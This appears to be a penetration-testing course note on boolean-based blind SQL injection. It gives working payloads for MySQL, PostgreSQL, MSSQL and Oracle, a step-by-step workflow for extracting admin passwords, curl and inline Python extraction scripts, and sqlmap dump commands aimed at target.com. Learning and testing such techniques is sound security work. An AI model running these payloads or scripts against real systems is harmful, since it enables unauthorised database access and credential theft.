---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.05 Blind SQLi — Boolean-Based"
portswigger_labs: "SQL injection"
---

# 06.05 — Blind SQLi — Boolean-Based

## What is Boolean-Based Blind SQLi?

In blind SQLi, the database doesn't show errors or data in the response. Boolean-based blind SQLi works by asking the database TRUE/FALSE questions. The page behaves differently for TRUE vs FALSE conditions — you infer data character-by-character from these binary signals.

```
VISIBLE SQLi: page returns data directly → easy!
BLIND SQLi:   page shows nothing different... but:
  
  TRUE condition  → page loads normally (200, full content)
  FALSE condition → page shows empty/different content (404, shorter page, no results)

EXAMPLE:
  Normal URL: https://target.com/product?id=1
  → Shows: "Widget - $9.99"
  
  True condition:  ?id=1 AND 1=1--   → "Widget - $9.99" (same!)
  False condition: ?id=1 AND 1=2--   → "Item not found" (DIFFERENT!)
  
  → CONFIRMED: Boolean injection possible!
  
  Now ask: "Is the first character of the admin password 'a'?"
  ?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
  → Same response as true = YES, first char is 'a'!
```

---

## Basic Boolean Payload Structure

```sql
-- BASE BOOLEAN TEST:
' AND 1=1--     → TRUE  (normal response)
' AND 1=2--     → FALSE (different response)

-- CONFIRM DIFFERENCE:
' AND 'a'='a'-- → TRUE
' AND 'a'='b'-- → FALSE

-- VERSION CHECK:
' AND substring(version(),1,1)='5'-- → TRUE if MySQL 5.x
' AND substring(version(),1,1)='8'-- → TRUE if MySQL 8.x
```

---

## Extracting Data Character-by-Character

```sql
-- IS DATABASE NAME LENGTH 6?
' AND LENGTH(database())=6--

-- FIRST CHARACTER OF DATABASE NAME:
' AND SUBSTRING(database(),1,1)='a'--  → FALSE
' AND SUBSTRING(database(),1,1)='b'--  → FALSE
...
' AND SUBSTRING(database(),1,1)='m'--  → TRUE! → first char is 'm'

-- SECOND CHARACTER:
' AND SUBSTRING(database(),2,1)='y'--  → TRUE! → second char is 'y'

-- → DATABASE IS: 'myapp' (continue for each character)

-- USING ASCII (binary search — faster!):
-- ASCII(char) = 109 for 'm'
' AND ASCII(SUBSTRING(database(),1,1))>64--   → TRUE  (109 > 64)
' AND ASCII(SUBSTRING(database(),1,1))>100--  → TRUE  (109 > 100)
' AND ASCII(SUBSTRING(database(),1,1))>110--  → FALSE (109 NOT > 110)
' AND ASCII(SUBSTRING(database(),1,1))>107--  → TRUE  (109 > 107)
' AND ASCII(SUBSTRING(database(),1,1))>108--  → TRUE  (109 > 108)
' AND ASCII(SUBSTRING(database(),1,1))>109--  → FALSE (109 NOT > 109)
→ ASCII 109 = 'm' (found with only ~7 requests instead of 26!)
```

---

## Complete Data Extraction Workflow

```sql
-- STEP 1: GET DATABASE NAME LENGTH
' AND LENGTH(database())=1--  → FALSE
' AND LENGTH(database())=2--  → FALSE
...
' AND LENGTH(database())=6--  → TRUE! → 6 characters

-- STEP 2: EXTRACT EACH CHARACTER OF DB NAME
For position i = 1 to 6:
  ' AND ASCII(SUBSTRING(database(),{i},1))>{n}--  → binary search

-- STEP 3: COUNT TABLES
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

-- STEP 4: GET LENGTH OF FIRST TABLE NAME
' AND LENGTH((SELECT table_name FROM information_schema.tables 
  WHERE table_schema=database() LIMIT 0,1))=5--

-- STEP 5: EXTRACT TABLE NAME CHARACTER BY CHARACTER
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables 
  WHERE table_schema=database() LIMIT 0,1),1,1))=117-- → 'u' (users!)

-- STEP 6: COUNT USERS
' AND (SELECT COUNT(*) FROM users)=3--

-- STEP 7: EXTRACT PASSWORD (for user 'admin')
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>47--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--
... (binary search for each character)
```

---

## Database-Specific Payloads

### MySQL

```sql
-- SUBSTRING:
' AND SUBSTRING(database(),1,1)='m'--

-- MID() (alternative):
' AND MID(database(),1,1)='m'--

-- LEFT():
' AND LEFT(database(),1)='m'--

-- ASCII + SUBSTRING:
' AND ASCII(SUBSTRING(database(),1,1))=109--  -- 109 = 'm'

-- LIKE with wildcards:
' AND database() LIKE 'm%'--    -- starts with 'm'?
' AND database() LIKE 'my%'--   -- starts with 'my'?
' AND database() LIKE 'myapp'-- -- equals 'myapp'?
```

### PostgreSQL

```sql
-- SUBSTRING:
' AND SUBSTRING(current_database(),1,1)='m'--

-- ASCII:
' AND ASCII(SUBSTRING(current_database(),1,1))=109--

-- ARRAY TRICK for faster extraction:
' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--
```

### MSSQL

```sql
-- SUBSTRING:
' AND SUBSTRING(DB_NAME(),1,1)='m'--

-- ASCII:
' AND ASCII(SUBSTRING(DB_NAME(),1,1))=109--

-- USING IIF:
' AND IIF(SUBSTRING(DB_NAME(),1,1)='m', 1, 0)=1--
```

### Oracle

```sql
-- SUBSTR (note: no N in Oracle):
' AND SUBSTR(user,1,1)='S'--

-- ASCII:
' AND ASCII(SUBSTR(user,1,1))=83-- -- 83='S'

-- EXISTS:
' AND EXISTS(SELECT * FROM all_tables WHERE table_name='USERS')--
```

---

## Conditional Responses Identification

```bash
# STEP 1: FIND THE DIFFERENCE BETWEEN TRUE AND FALSE:
# Normal (TRUE condition):
curl "https://target.com/product?id=1 AND 1=1--" -o true_response.html
wc -c true_response.html    # e.g., 4823 bytes

# FALSE condition:
curl "https://target.com/product?id=1 AND 1=2--" -o false_response.html
wc -c false_response.html   # e.g., 1247 bytes

# RESPONSE DIFFERS → BLIND SQLi CONFIRMED!
# Now use the size difference to infer TRUE/FALSE for each payload

# AUTOMATED APPROACH WITH PYTHON:
python3 -c "
import requests

base = 'https://target.com/product?id=1'
true_len  = len(requests.get(base + ' AND 1=1--').text)
false_len = len(requests.get(base + ' AND 1=2--').text)
print(f'TRUE length: {true_len}, FALSE length: {false_len}')

# Extract first char of database name:
for c in 'abcdefghijklmnopqrstuvwxyz0123456789_':
    payload = f\" AND SUBSTRING(database(),1,1)='{c}'--\"
    r = requests.get(base + payload)
    if len(r.text) == true_len:
        print(f'First char of database: {c}')
        break
"
```

---

## SQLMap for Boolean-Based Blind

```bash
# SQLMAP DETECTS AND EXPLOITS BLIND AUTOMATICALLY:
sqlmap -u "https://target.com/product?id=1" --technique=B

# DUMP DATABASE:
sqlmap -u "https://target.com/product?id=1" --technique=B --dbs

# DUMP SPECIFIC TABLE:
sqlmap -u "https://target.com/product?id=1" --technique=B \
  -D myapp -T users --dump

# CUSTOM TRUE/FALSE STRINGS (custom application):
sqlmap -u "https://target.com/product?id=1" \
  --string="Item found"    # appears on TRUE
# OR:
sqlmap -u "https://target.com/product?id=1" \
  --not-string="Not found" # appears on FALSE
```

---

## Related Notes
- [[01 - What is SQL Injection]] — SQLi introduction
- [[06 - Blind SQLi Time-Based]] — time-based when no visual difference
- [[04 - Union-Based SQLi]] — when output is visible
- [[21 - sqlmap Full Usage Guide]] — automate blind extraction
